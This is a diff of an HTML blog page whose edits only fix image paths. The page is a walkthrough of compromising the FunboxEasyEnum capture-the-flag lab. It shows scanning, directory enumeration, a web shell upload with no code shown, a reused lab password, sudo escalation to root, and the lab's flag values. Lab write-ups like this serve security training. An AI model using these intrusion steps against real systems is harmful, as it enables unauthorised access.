@@ -73,7 +73,7 @@ nmap -sC -sV -A -T4 -p- 192.168.235.132 -o scan Starting Nmap 7.94SVN ( https://
 
     <div class="content">
       <p><p class="markdown-image">
-  <img src="Homepage-default-preview.jpg" alt="image1"  />
+  <img src="FunboxEasyEnum/Homepage-default-preview.jpg" alt="image1"  />
 </p></p>
 <p>On a lazy Saturday morning, August 17, 2024, I embarked on a thrilling adventure in the world of Offensive Security, tackling the FunboxEasyEnum box on the Proving Grounds Play labs. This easy-level warmup machine was the perfect way to kick-start my journey, and I&rsquo;m excited to share my experience with you.</p>
 <h3 id="port-scan">Port Scan <a href="#port-scan" class="anchor">🔗</a></h3><p>From port scan we got:</p>
@@ -97,17 +97,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 43.77 seconds
 
 </code></pre></div><h3 id="enumeration">Enumeration <a href="#enumeration" class="anchor">🔗</a></h3><p>Ran gobuster for directory enumeration:</p>
-<p>![[Pasted image 20240814141922.png]]</p>
+<p>![image2](FunboxEasyEnum/Pasted image 20240814141922.png)</p>
 <p>Only /phpmyadmin is accessible
-![[Pasted image 20240814142029.png]]</p>
+![image1](FunboxEasyEnum/Pasted image 20240814142029.png)</p>
 <p>Analyzing burp request found that /phpmyadmin/js/whitelist.php and /js/messages.php are readable:
-![[Pasted image 20240814143143.png]]</p>
+![image1](FunboxEasyEnum/Pasted image 20240814143143.png)</p>
 <p>Nothing interesting here, re run enumeration with gobuster filtering for php file:</p>
-<p>![[Pasted image 20240814144359.png]]</p>
+<p>![image1](FunboxEasyEnum/Pasted image 20240814144359.png)</p>
 <p>Try mini.php:</p>
-<p>![[Pasted image 20240814144433.png]]</p>
+<p>![image1](FunboxEasyEnum/Pasted image 20240814144433.png)</p>
 <h3 id="access">Access <a href="#access" class="anchor">🔗</a></h3><p>I uploaded a shell.php while listening on my kali:</p>
-<p>![[Pasted image 20240814145857.png]]</p>
+<p>![image1](FunboxEasyEnum/Pasted image 20240814145857.png)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root        <span style="color:#ae81ff">31</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> vmlinuz.old -&gt; boot/vmlinuz-4.15.0-117-generic
 $ cd /var/www/ 
 $ ls
@@ -190,7 +190,7 @@ $dbport<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3306
 $dbtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mysql&#39;</span>;
 
 </code></pre></div><p>Now we can log in phpmyadmin</p>
-<p>![[Pasted image 20240815213653.png]]</p>
+<p>![image1](FunboxEasyEnum/Pasted image 20240815213653.png)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo su karla:tgbzhnujm! 
 </code></pre></div><p>Let&rsquo;s see what karla can run</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">karla@funbox7:~$ sudo -l
@@ -210,7 +210,7 @@ root@funbox7:/home/karla# cd /root
 root@funbox7:~# ls
 proof.txt  root.flag
 root@funbox7:~# 
-</code></pre></div><p>![[Pasted image 20240815214144.png]]</p>
+</code></pre></div><p>![image1](FunboxEasyEnum/Pasted image 20240815214144.png)</p>
 <h1 id="flags">Flags <a href="#flags" class="anchor">🔗</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">local:896e80f60f8536d18c123448e656a7fc
 proof.txt: d0a70330bf49d3799b000cbe3d7ec011
 </code></pre></div>
